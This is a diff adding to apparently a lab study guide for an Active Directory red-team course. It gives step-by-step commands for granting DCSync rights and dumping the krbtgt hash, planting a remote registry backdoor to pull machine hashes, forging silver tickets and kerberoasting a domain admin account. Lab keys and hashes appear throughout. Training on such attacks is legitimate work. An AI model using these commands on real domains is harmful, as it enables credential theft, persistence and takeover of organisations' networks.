@@ -311,7 +311,7 @@ Get-ForestDomain -Forest eurocorp.local | %{Get-DomainTrust -Domain $_.Name}
 
 
 ```powershell
-$ Get-ServiceUnquoted -Verbose
+Invoke-AllChecks
 
 # Note down the "ServiceName:" with unquoted paths
 ```
@@ -1457,3 +1457,291 @@ ls \\dcorp-dc.dollarcorp.moneycorp.local\c$
 
 
 ![](https://i.imgur.com/IRluJRE.png)
+
+
+
+### **Enumerating Replication (DCSync) rights**
+
+- Check if `studentx` has replication rights (Run from an elevated command prompt) -
+
+```powershell
+# Load invisi-shell
+C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
+
+# Load Powerview
+. C:\AD\Tools\PowerView.ps1
+
+# check rights
+Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "studentx"}
+```
+
+> If you probably don't get any output then you don't have replication rights, we can go ahead and add them by ourself
+
+
+- Start a process as Domain Administrator (Run from an elevated command prompt)
+
+```powershell
+C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+```
+
+
+- Run the below commands in the new process. Remember to change `studentx` to your user
+
+
+```powershell
+# Load invisi-shell
+C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
+
+# Load powerview
+. C:\AD\Tools\PowerView.ps1
+
+# Add rights
+Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity studentx -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
+```
+
+
+![](https://i.imgur.com/ypwVnJz.png)
+
+- Let’s check for the rights once again from a normal shell
+
+```powershell
+# Load invisi-shell
+C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
+
+# Load Powerview
+. C:\AD\Tools\PowerView.ps1
+
+# check rights
+Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "studentx"}
+```
+
+
+- Your Output should look like this
+
+
+```powershell
+AceQualifier           : AccessAllowed
+ObjectDN               : DC=dollarcorp,DC=moneycorp,DC=local
+ActiveDirectoryRights  : ExtendedRight
+ObjectAceType          : DS-Replication-Get-Changes-In-Filtered-Set
+ObjectSID              : S-1-5-21-719815819-3726368948-3917688648
+InheritanceFlags       : None
+BinaryLength           : 56
+AceType                : AccessAllowedObject
+ObjectAceFlags         : ObjectAceTypePresent
+IsCallback             : False
+PropagationFlags       : None
+SecurityIdentifier     : S-1-5-21-719815819-3726368948-3917688648-4105
+AccessMask             : 256
+AuditFlags             : None
+IsInherited            : False
+AceFlags               : None
+InheritedObjectAceType : All
+OpaqueLength           : 0
+IdentityName           : dcorp\student505
+
+AceQualifier           : AccessAllowed
+ObjectDN               : DC=dollarcorp,DC=moneycorp,DC=local
+ActiveDirectoryRights  : ExtendedRight
+ObjectAceType          : DS-Replication-Get-Changes
+ObjectSID              : S-1-5-21-719815819-3726368948-3917688648
+InheritanceFlags       : None
+BinaryLength           : 56
+AceType                : AccessAllowedObject
+ObjectAceFlags         : ObjectAceTypePresent
+IsCallback             : False
+PropagationFlags       : None
+SecurityIdentifier     : S-1-5-21-719815819-3726368948-3917688648-4105
+AccessMask             : 256
+AuditFlags             : None
+IsInherited            : False
+AceFlags               : None
+InheritedObjectAceType : All
+OpaqueLength           : 0
+IdentityName           : dcorp\student505
+
+AceQualifier           : AccessAllowed
+ObjectDN               : DC=dollarcorp,DC=moneycorp,DC=local
+ActiveDirectoryRights  : ExtendedRight
+ObjectAceType          : DS-Replication-Get-Changes-All
+ObjectSID              : S-1-5-21-719815819-3726368948-3917688648
+InheritanceFlags       : None
+BinaryLength           : 56
+AceType                : AccessAllowedObject
+ObjectAceFlags         : ObjectAceTypePresent
+IsCallback             : False
+PropagationFlags       : None
+SecurityIdentifier     : S-1-5-21-719815819-3726368948-3917688648-4105
+AccessMask             : 256
+AuditFlags             : None
+IsInherited            : False
+AceFlags               : None
+InheritedObjectAceType : All
+OpaqueLength           : 0
+IdentityName           : dcorp\student505
+```
+
+
+
+- Sweet! Now, below command (or any similar tool) can be used as `studentx` to get the hashes of krbtgt user or any other user, (Run from an elevated command prompt)
+
+
+```powershell
+C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
+```
+
+
+
+### **PowerShell Remoting and WMI Access via Security Descriptor Modification on dcorp-dc**
+
+
+**Once we have administrative privileges on a machine, we can modify security descriptors of services to access the services without administrative privileges. Below command (to be run as Domain Administrator) modifies the host security descriptors for `WMI` on the DC to allow `studentx` access to `WMI`**
+
+- Start a process as domain admin
+
+```powershell
+C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+```
+
+
+- On the new spawned process run this
+
+
+```powershell
+C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
+
+. C:\AD\Tools\RACE.ps1
+
+# Modify security descriptor
+Set-RemoteWMI -SamAccountName studentx -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose
+```
+
+
+
+- Now, we can execute `WMI` queries on the DC as `studentx` (spawn a new powershell process) -
+
+```powershell
+powershell
+
+gwmi -class win32_operatingsystem -ComputerName dcorp-dc
+```
+
+
+![](https://i.imgur.com/FmYDwF2.png)
+
+
+
+### **Silver Ticket Attack via Machine Account Hash in dcorp-dc**
+
+
+- Start a process as domain admin
+
+```powershell
+C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+```
+
+
+- To retrieve machine account hash without DA, first we need to modify permissions on the DC. On the new spawned process run this -:
+
+
+```powershell
+powershell
+
+. C:\AD\Tools\RACE.ps1
+
+# retrieve machine account hash
+Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Trustee studentx -Verbose
+```
+
+
+![](https://i.imgur.com/83LGb7O.png)
+
+
+
+- Now, we can retrieve hash as `studentx` (Spawn a new powershell process) -
+
+
+```powershell
+. C:\AD\Tools\RACE.ps1
+
+Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose
+```
+
+
+![](https://i.imgur.com/uHQje6w.png)
+
+
+**We can then generate Silver Tickets for HOST and RPCSS with the machine account hash, enabling WMI query execution**
+
+
+```powershell
+C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:f5a2cef076a16742b123b8ed07c372c1 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
+```
+
+
+```powershell
+C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:RPCSS /rc4:f5a2cef076a16742b123b8ed07c372c1 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
+```
+
+
+- Run the below command for `WMI` query execution
+
+
+```powershell
+C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
+
+gwmi -Class win32_operatingsystem -ComputerName dcorp-dc
+```
+
+
+![](https://i.imgur.com/JU363Qh.png)
+
+
+
+# **Domain Privilege Escalation**
+
+
+### **Kerberoast Attack - Crack SQL Server Service Account Password**
+
+
+- Identify Services Running with User Accounts for Easier Password Cracking using `PowerView` -
+
+```powershell
+C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
+
+. C:\AD\Tools\PowerView.ps1
+
+Get-DomainUser -SPN
+
+# Important Output -:
+# samaccountname
+# serviceprincipalname
+```
+
+
+![](https://i.imgur.com/yi9qbOd.png)
+
+
+
+**Neat! The `svcadmin`, which is a domain administrator has a SPN set! Let's Kerberoast it!**
+
+
+- Retrieve Hashes for `svcadmin` Account with `Rubeus`, Focusing on **RC4**-Supported Accounts to Bypass AES Encryption (Run Command from elevated prompt)
+
+
+```powershell
+C:\AD\Tools\Rubeus.exe kerberoast /user:svcadmin /simple /rc4opsec /outfile:C:\AD\Tools\hashes.txt
+```
+
+
+![](https://i.imgur.com/JHhSzlr.png)
+
+
+
+
+> **You should now have your hashes written to `C:\AD\Tools\hashes.txt`, We can now use John the Ripper to brute-force the hashes. Please note that you need to remove "`:1433`" from the SPN in `hashes.txt` before running John**
+
+
+
+
+![](https://i.imgur.com/uxUMZQg.png)
